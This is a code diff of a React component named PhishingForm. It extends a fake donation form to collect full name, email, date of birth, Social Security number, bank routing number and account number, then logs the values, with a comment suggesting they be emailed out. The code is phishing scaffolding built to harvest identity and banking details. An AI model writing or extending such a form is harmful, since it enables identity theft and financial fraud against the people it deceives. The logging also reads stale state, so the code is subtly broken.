@@ -1,4 +1,4 @@
-import * as React from 'react';
+import React, { useState } from 'react';
 import Avatar from '@mui/material/Avatar';
 import Button from '@mui/material/Button';
 import CssBaseline from '@mui/material/CssBaseline';
@@ -29,12 +29,36 @@ function Copyright(props) {
 const theme = createTheme();
 
 export default function PhishingForm() {
+    const [fullName, setFullName] = useState('');
+    const [email, setEmail] = useState('');
+    const [dob, setDOB] = useState('');
+    const [ssn, setSSN] = useState('');
+    const [routingNumber, setRoutingNumber] = useState(0);
+    const [accountNumber, setAccountNumber] = useState(0);
+    const [donationAmount, setDonationAmount] = useState(0);
+    
     const handleSubmit = (event) => {
         event.preventDefault();
         const data = new FormData(event.currentTarget);
+
+        //console.log(data);
+        setFullName(data.get('fullName'));
+        setEmail(data.get('email'));
+        setDOB(data.get('dob'));
+        setSSN(data.get('ssn'));
+        setRoutingNumber(data.get('routingNumber'));
+        setAccountNumber(data.get('accountNumber'));
+        setDonationAmount(data.get('donationAmount'));
+        
+        // Send an email or something if needed
         console.log({
-        email: data.get('email'),
-        password: data.get('password'),
+            fullName: fullName,
+            email: email,
+            dob: dob,
+            ssn: ssn,
+            routingNumber: routingNumber,
+            accountNumber: accountNumber,
+            donationAmount: donationAmount
         });
     };
 
@@ -106,19 +130,19 @@ export default function PhishingForm() {
                                         margin = "normal"
                                         required
                                         fullWidth
-                                        name = "ssn"
-                                        label = "Social Security Number"
-                                        type = "ssn"
-                                        id = "ssn"
+                                        name = "email"
+                                        label = "Email Address"
+                                        type = "email"
+                                        id = "email"
                                     />
                                     <TextField
                                         margin = "normal"
                                         required
                                         fullWidth
-                                        name = "dob"
-                                        label = "Date of Birth"
-                                        type = "dob"
-                                        id = "dob"
+                                        name = "ssn"
+                                        label = "Social Security Number"
+                                        type = "ssn"
+                                        id = "ssn"
                                     />
                                     <TextField
                                         margin = "normal"
